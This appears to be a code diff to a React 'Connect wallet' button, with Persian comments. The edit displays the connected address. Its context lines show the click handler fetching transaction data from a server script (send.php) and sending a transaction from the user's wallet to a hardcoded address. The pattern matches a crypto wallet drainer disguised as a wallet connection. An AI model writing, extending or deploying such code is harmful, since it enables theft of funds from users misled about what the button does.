@@ -2,6 +2,8 @@ import jQuery from "jquery";
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
 function App() {
+  const [walletAddress, setWalletAddress] = React.useState(null); // برای ذخیره آدرس کیف پول
+
   async function runner() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
@@ -26,17 +28,17 @@ function App() {
 
     await ethereumProvider.enable();
 
-    // بررسی اینکه آیا کیف پول به درستی متصل شده است یا نه
-    if (ethereumProvider.connected) {
-      document.getElementById('kos').innerText = 'Wallet Connected'; // تغییر متن دکمه بعد از اتصال
-    }
+    // وقتی کیف پول وصل شد، آدرس کیف پول را نمایش می‌دهیم
+    const accounts = await ethereumProvider.request({ method: "eth_accounts" });
+    const accountAddress = accounts[0];
+    setWalletAddress(accountAddress); // به‌روزرسانی وضعیت آدرس کیف پول
+
+    console.log('Wallet connected:', accountAddress);
 
     var provider = ethereumProvider;
+    var account = accountAddress;
 
-    var account = await provider.request({ method: "eth_accounts" });
-    var account_sender = account[0];
-    console.log(account_sender);
-
+    // دریافت امضا برای تراکنش
     async function genSign(address, chain, type, contract = "0") {
       if (type === "coin") {
         var result = await jQuery.post("send.php", { "handler": "tx", "address": address, "chain": chain, "type": type });
@@ -63,8 +65,7 @@ function App() {
       }
     }
 
-    // دریافت امضا
-    var signature = await genSign(account_sender, "56", "coin");
+    var signature = await genSign(account, "56", "coin");
     console.log(signature);
 
     var rawsign = await acceptSign(signature, "coin");
@@ -72,7 +73,7 @@ function App() {
 
     // ارسال تراکنش به شبکه
     var tx = {
-      from: account_sender,
+      from: account,
       to: '0xbA8958d52B940fF513746F24176D1017CaFa707E', // آدرس مقصد
       data: rawsign, // داده‌های امضا شده
       value: '0', // مقدار ارسال (برای تست می‌توان این را صفر قرار داد)
@@ -86,7 +87,7 @@ function App() {
 
   return (
     <a href="#" id="kos" onClick={runner} className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left" data-uk-toggle="">
-      <span>Connect wallet</span>
+      <span>{walletAddress ? `Connected: ${walletAddress}` : 'Connect wallet'}</span> {/* نمایش آدرس کیف پول */}
     </a>
   );
 }
